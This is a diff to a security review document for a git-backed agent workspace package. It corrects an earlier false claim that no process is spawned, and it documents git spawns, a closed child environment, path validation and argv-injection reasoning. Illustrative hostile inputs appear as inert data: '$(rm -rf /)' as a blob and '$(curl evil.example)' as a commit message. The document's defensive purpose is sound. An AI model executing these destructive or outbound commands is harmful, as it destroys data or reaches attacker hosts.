@@ -1,6 +1,6 @@
 # Security — `@ax/workspace-git-core`
 
-This package is the implementation behind the `workspace:*` contract. It exports one function — `registerWorkspaceGitHooks` — that registers the four service hooks (`workspace:apply`, `workspace:read`, `workspace:list`, `workspace:diff`) on a host-side bus and stores every snapshot in a bare `isomorphic-git` repository at `<repoRoot>/<workspaceId>.git`, where `workspaceId` is derived from the calling `agentId` — one repo per agent, never one for the deployment. **Linear-history-only by construction:** every `workspace:apply` is a CAS on `refs/heads/main`. There are no branches, no merges, no rebase. The `WorkspaceVersion` opaque string happens to be a 40-hex commit SHA today, but subscribers MUST treat it as opaque (Invariant 1).
+This package is the implementation behind the `workspace:*` contract. It exports one function — `registerWorkspaceGitHooks` — that registers **six** service hooks (the four base ones, `workspace:apply`, `workspace:read`, `workspace:list`, `workspace:diff`, plus the two Phase 3 bundle hooks, `workspace:apply-bundle` and `workspace:export-baseline-bundle`) on a host-side bus and stores every snapshot in a bare git repository at `<repoRoot>/<workspaceId>.git`, where `workspaceId` is derived from the calling `agentId` — one repo per agent, never one for the deployment. **Linear-history-only by construction:** every `workspace:apply` is a CAS on `refs/heads/main`. There are no branches, no merges, no rebase. The `WorkspaceVersion` opaque string happens to be a 40-hex commit SHA today, but subscribers MUST treat it as opaque (Invariant 1).
 
 **One** consumer wraps this core: `@ax/workspace-git`, the in-process plugin for single-pod / local-CLI deployments. It imports the core directly and calls `registerWorkspaceGitHooks` at `init()` time. It is also the **chart's default** (`workspace.backend: local`), which makes this the code that serves production unless an operator opts out.
 
@@ -10,7 +10,7 @@ So: this note covers **this** code and nothing else. Read `@ax/workspace-git-ser
 
 ## Security review (workspace-git-core)
 
-- **Sandbox:** Filesystem reach is fenced to `<repoRoot>/<workspaceId>.git`, and `workspaceId` is a `ws-` prefix plus 16 hex chars — a caller cannot steer it at a directory of their choosing; every write goes through `isomorphic-git`'s object-db (no caller-supplied path ever reaches `fs.writeFile` directly), and `validatePath` rejects `..`, absolute, NUL, backslash, and `.git` segments before any blob is written. No process spawn, no env reads, no network — `isomorphic-git` is pure JS and we don't ship the `http` variant.
+- **Sandbox:** Filesystem reach is fenced to `<repoRoot>/<workspaceId>.git`, and `workspaceId` is a `ws-` prefix plus 16 hex chars — a caller cannot steer it at a directory of their choosing; every write goes through `isomorphic-git`'s object-db (no caller-supplied path ever reaches `fs.writeFile` directly), and `validatePath` rejects `..`, absolute, NUL, backslash, and `.git` segments before any blob is written. No network — we don't ship `isomorphic-git`'s `http` variant. We **do** spawn the real `git` binary (bundle hooks, and the read paths since TASK-73) — no shell, argv arrays only, a closed hard-coded child env that does not inherit `process.env`, and a pinned `PATH`; see **Process spawn** below, which used to claim the opposite.
 - **Injection:** `FileChange.content` is opaque `Uint8Array` written via `git.writeBlob` — never interpolated into a shell, path, SQL, or URL. Agent-supplied `reason` lands in the commit message only; agent-supplied `agentId`/`userId`/`sessionId` land in `WorkspaceDelta.author` only and are never used as the git author/email (those are hard-coded `ax-runner`).
 - **Supply chain:** Two runtime deps, both pinned exact: `isomorphic-git@1.37.5` (MIT, established maintainer set, no install hooks) and `picomatch@4.0.4` (MIT, Jon Schlinkert / micromatch org, no install hooks). Transitive surface is mostly self-contained pure-JS git plumbing; one entry (`simple-get`) is network-capable but unreachable from the code paths we use.
 
@@ -22,7 +22,7 @@ The capability budget for this code is one directory and zero of everything else
 
 `repoRoot` comes from caller config and never from a hook payload — it's set once when `registerWorkspaceGitHooks` is called. Everything we write goes under `<repoRoot>/<workspaceId>.git/` via `isomorphic-git`'s `gitdir` parameter, and the only input to `workspaceId` is the bus-supplied caller identity, hashed. The library writes loose objects into `objects/`, refs into `refs/`, packs into `objects/pack/`, and that's it. No part of this code path ever calls `fs.writeFile` with a caller-supplied path string — paths from `FileChange` go to `git.writeBlob` as content, not as filenames, and the resulting OID is the only thing that hits the FS.
 
-For the writes that DO touch caller-supplied filenames (the path inside the tree object), `validatePath` (`impl.ts:91-143`) runs BEFORE the mutex is taken so a bad input fails fast and can't deadlock. It rejects:
+For the writes that DO touch caller-supplied filenames (the path inside the tree object), `validatePath` (`impl.ts`) runs BEFORE the mutex is taken so a bad input fails fast and can't deadlock. It rejects:
 
 - Empty / non-string paths.
 - NUL bytes (which would otherwise truncate when crossing into native syscalls).
@@ -31,23 +31,41 @@ For the writes that DO touch caller-supplied filenames (the path inside the tree
 - Empty segments, `.`, and `..` (which would otherwise traverse out of the repo if a future backend resolved them naively).
 - Any segment named `.git` (defense-in-depth; we don't currently materialize the working tree, but if a future backend does, this prevents writing into the metadata dir).
 
-Reads, lists, and diffs (`impl.ts:445-542`) take a `path` parameter that goes to `git.readBlob({ filepath })` and `git.listFiles({ ref })`. These resolve against the object-db's tree structure, not the host filesystem — `..` in a `readBlob` filepath asks for an entry literally named `..` inside the tree, which doesn't exist, and you get a `NotFoundError`. There's no host-FS traversal vector here even without `validatePath` on the read side.
+Reads, lists, and diffs take a `path` parameter that is resolved **inside the git object database**, never against the host filesystem. Since TASK-73 these go through the git binary as `git cat-file blob <oid>:<path>` and `git ls-tree -r -z --name-only <oid>` (not iso-git's `readBlob`/`listFiles`, whose `fs.read` adapter could coalesce a transient short read into a silently wrong answer — see `__tests__/null-slice-race.test.ts`). Either way the lookup is a tree-entry lookup: `..` in that position asks for an entry literally *named* `..` inside the tree, which does not exist, and you get a not-found. There is no host-FS traversal vector on the read side even without `validatePath`. What the read paths DO depend on is the identity gate — `<oid>` and the gitdir are chosen by `requireAgent`, not by the caller.
 
 ### Process spawn
 
-None. We confirmed by inspection that `impl.ts` imports only `node:fs`, `node:path`, `isomorphic-git`, `picomatch`, and `@ax/core`. No `child_process`, no `execa`, no `spawn`, no shell. `isomorphic-git` is pure JavaScript by design — that's the entire reason it exists, as a replacement for shelling out to `/usr/bin/git`. If a future change introduced a shell-out for performance (e.g., delegating to `git pack-objects`), that would need its own security review and almost certainly its own argv-injection story.
+**Yes — we spawn the real `git` binary, and this section used to say we didn't.**
+
+It read: *"None. We confirmed by inspection that `impl.ts` imports only `node:fs`, `node:path`, `isomorphic-git`, `picomatch`, and `@ax/core`. No `child_process`, no `execa`, no `spawn`, no shell."* Line 1 of `impl.ts` is `import { spawn } from 'node:child_process'`. The claim went stale when the read paths migrated to the git binary (TASK-73 / PR #71) and nobody came back here. We're leaving the old wording quoted above rather than silently swapping it, because "a doc that confidently describes a capability we don't have" is its own finding — and this one survived two review passes of a PR *about* false isolation claims before someone checked it against line 1.
+
+What actually spawns, and why:
+
+- **The bundle hooks** (`workspace:apply-bundle`, `workspace:export-baseline-bundle`). `isomorphic-git` has no bundle support at all — not create, not verify, not fetch-from-bundle. The bundle wire is the contract with the runner, so short of reimplementing the pack format, real `git` is the only option.
+- **The read paths** (`workspace:read`, `workspace:list`, and `diff`'s snapshot reads) use `git cat-file blob` and `git ls-tree` rather than `git.readBlob` / `git.listFiles`, because iso-git's `fs.read` adapter coalesces transient short reads into a silent wrong answer (the null-slice race — see `__tests__/null-slice-race.test.ts`). We took a spawn over a backend that can quietly return the wrong bytes.
+
+Why it's safe, all of which is real code in `runGit` / `runGitBinary`:
+
+- **No shell, ever.** `spawn('git', argsArray)` with an array — there is no shell to inject into, so `;`, backticks, `$(…)` and friends are inert argument text.
+- **`process.env` is NOT inherited.** The child gets a closed, hard-coded env (`GIT_PROCESS_ENV`): `GIT_CONFIG_NOSYSTEM=1`, `GIT_CONFIG_GLOBAL=/dev/null`, `GIT_TERMINAL_PROMPT=0`, `HOME=/nonexistent`, a fixed `PATH`, and the pinned `ax-runner` author identity. No system or global gitconfig is read, so no `core.fsmonitor`/`core.pager`-style config-to-code vector, and no host secret reaches the child.
+- **`PATH` is a closed list**, not the ambient one, so a malicious `git` earlier on the operator's `$PATH` can't be picked up.
+- **`stdio` is `['ignore','pipe','pipe']`** — no stdin, so nothing can drive an interactive prompt.
+
+### Argv injection
+
+The argv arrays are built from OIDs and validated paths, never from raw caller text, and they are passed as an **array** — so the worst case is a malformed argument, not a second command.
+
+Caller-influenced values that reach argv: `input.baselineCommit`, resolved commit OIDs, the bundle's new tip, and `FileChange.path`. The OIDs are either produced by `git` itself or, for `baselineCommit`, checked against a locally-computed baseline before anything is written (a mismatch throws before `gitdir` is touched). Paths have already been through `validatePath`.
+
+The one shape worth naming: an argument that *starts with a dash* would be read by `git` as a flag rather than a value. Our argv positions are fixed and the values that land in them are OIDs (`[0-9a-f]{40}`) and `<oid>:<path>` pairs, so a leading `-` is not reachable today. If a future change ever passes a free-form caller string as a positional argument, it needs a `--` separator and its own review.
 
 ### Env vars
 
-None read by this code. `repoRoot` comes from config, the bot author identity is hard-coded (`impl.ts:39-42`), and there's no `process.env.*` access in `impl.ts`.
+None read at the caller's direction. `repoRoot` comes from config, the bot author identity is hard-coded, and there is no `process.env[someCallerValue]` anywhere in `impl.ts`. Note the asymmetry with the section above: we do not *read* env, but we do *construct* a fixed env for the git children, and `GIT_PROCESS_ENV` deliberately starts from `{}` rather than spreading `process.env`.
 
 ### Network
 
 None. We import `isomorphic-git`, NOT `isomorphic-git/http/node` — the network-capable HTTP variant is a separate sub-export that this package never references. The transitive dep `simple-get` is pulled in because `isomorphic-git`'s package.json lists it as a dependency, but it's only invoked from the `http` code paths, which we don't touch. If we ever add `git.clone` / `git.push` / `git.fetch`, network capability arrives with them and that's a separate review.
-
-### Argv injection
-
-Not applicable. There's no shell command construction, no argv array, nothing to inject into.
 
 ## Tenant isolation
 
@@ -102,19 +120,19 @@ Never reaches this code directly. Tools running in the sandbox may compute path 
 
 ### Tool output
 
-`FileChange.content` is `Bytes` (`Uint8Array`). It's written verbatim via `git.writeBlob` (`impl.ts:181`) and read back verbatim via `git.readBlob`. We never decode it, never interpret it as JSON or a shell command, never log it, never interpolate it. A blob containing `$(rm -rf /)` is just 14 bytes that go into the object-db and come back out as 14 bytes.
+`FileChange.content` is `Bytes` (`Uint8Array`). It's written verbatim via `git.writeBlob` and read back verbatim via `git.readBlob`. We never decode it, never interpret it as JSON or a shell command, never log it, never interpolate it. A blob containing `$(rm -rf /)` is just 14 bytes that go into the object-db and come back out as 14 bytes.
 
-We do make a defensive copy of incoming bytes in `applyChanges` (`impl.ts:247-260`) so a caller mutating their input buffer after `apply` returns can't poison our snapshot, and another defensive copy on the way out of `read` and `readBlobBytes` so a subscriber mutating the returned buffer can't poison whatever isomorphic-git might cache or share.
+We do make a defensive copy of incoming bytes in `applyChanges` (`impl.ts`) so a caller mutating their input buffer after `apply` returns can't poison our snapshot, and another defensive copy on the way out of `read` and `readBlobBytes` so a subscriber mutating the returned buffer can't poison whatever isomorphic-git might cache or share.
 
 ### Agent-supplied `reason`
 
-Flows into the git commit message via `git.commit({ message: input.reason ?? 'workspace apply' })` (`impl.ts:414-418`). isomorphic-git serializes this into the commit object byte-for-byte; there's no shell, no template, no `eval`. A `reason` containing `\n--no-verify\n` or `$(curl evil.example)` is just text that ends up in the commit body.
+Flows into the git commit message via `git.commit({ message: input.reason ?? 'workspace apply' })` (`applyChanges` in `impl.ts`). isomorphic-git serializes this into the commit object byte-for-byte; there's no shell, no template, no `eval`. A `reason` containing `\n--no-verify\n` or `$(curl evil.example)` is just text that ends up in the commit body.
 
 That said: subscribers of the future `workspace:applied` subscriber hook MUST NOT shell-interpolate or `exec` the `reason`. If a notification subscriber pipes commit messages into a system shell ("send a Slack message that says: $reason"), they own that injection. We treat `reason` as untrusted on the producer side — anyone reading it downstream needs to do the same.
 
 ### Agent-supplied provenance
 
-`ctx.agentId`, `ctx.userId`, and `ctx.sessionId` flow into `WorkspaceDelta.author` (`impl.ts:388-392`) and from there into the `applied` subscriber hook payload. They are NOT used as the git `author.name` / `author.email` — those are the hard-coded `BOT_AUTHOR = { name: 'ax-runner', email: 'ax-runner@example.com' }` (`impl.ts:39-42`). The agent never gets to sign a commit as someone else. Anyone running `git log` on the repo sees `ax-runner` as the author of every commit; the human/agent provenance lives in the bus payload, where subscribers know to treat it as untrusted metadata rather than verified identity.
+`ctx.agentId`, `ctx.userId`, and `ctx.sessionId` flow into `WorkspaceDelta.author` (`buildDelta` in `impl.ts`) and from there into the `applied` subscriber hook payload. They are NOT used as the git `author.name` / `author.email` — those are the hard-coded `BOT_AUTHOR = { name: 'ax-runner', email: 'ax-runner@example.com' }` (`BOT_AUTHOR` in `impl.ts`). The agent never gets to sign a commit as someone else. Anyone running `git log` on the repo sees `ax-runner` as the author of every commit; the human/agent provenance lives in the bus payload, where subscribers know to treat it as untrusted metadata rather than verified identity.
 
 ## Supply chain
 
@@ -143,7 +161,7 @@ Two runtime deps. Both pinned to exact versions in `package.json` (no `^` or `~`
 - **Pin:** Exact (`"picomatch": "4.0.4"`).
 - **Maintainers:** `jonschlinkert` (Jon Schlinkert, micromatch org), `mrmlnc`, `doowb`, `danez`. Established npm maintainers; `picomatch` is the glob engine behind `chokidar`, `micromatch`, `fast-glob`, and most of the file-watching ecosystem. Weekly downloads in the hundreds of millions.
 - **Install hooks:** None. `npm view picomatch@4.0.4 scripts` returns `lint`, `test`, `mocha`, `test:ci`, `test:cover` — all dev-time. No `preinstall`, `install`, `postinstall`, or `prepare`.
-- **Use:** `workspace:list` calls `picomatch(input.pathGlob, { dot: true })` (`impl.ts:481`) when the caller passes a glob, and filters the listed paths through it. The matcher receives caller-supplied glob strings, but the matcher's output is just a boolean over already-validated path strings — even a maliciously crafted glob can at worst match too few or too many files, not escape the repo. The `{ dot: true }` flag means we don't silently hide entries starting with `.`.
+- **Use:** `workspace:list` calls `picomatch(input.pathGlob, { dot: true })` (the `workspace:list` handler in `impl.ts`) when the caller passes a glob, and filters the listed paths through it. The matcher receives caller-supplied glob strings, but the matcher's output is just a boolean over already-validated path strings — even a maliciously crafted glob can at worst match too few or too many files, not escape the repo. The `{ dot: true }` flag means we don't silently hide entries starting with `.`.
 - **Known concerns:** glob libraries have historically had ReDoS issues. `picomatch` mitigates by compiling the glob to a regex with bounded backtracking, but a sufficiently pathological glob could still spike CPU. The glob comes from a host-side caller today (the runner, not the agent); when sandbox-side tools are allowed to specify `pathGlob`, this is worth re-checking.
 
 ## Boundary review
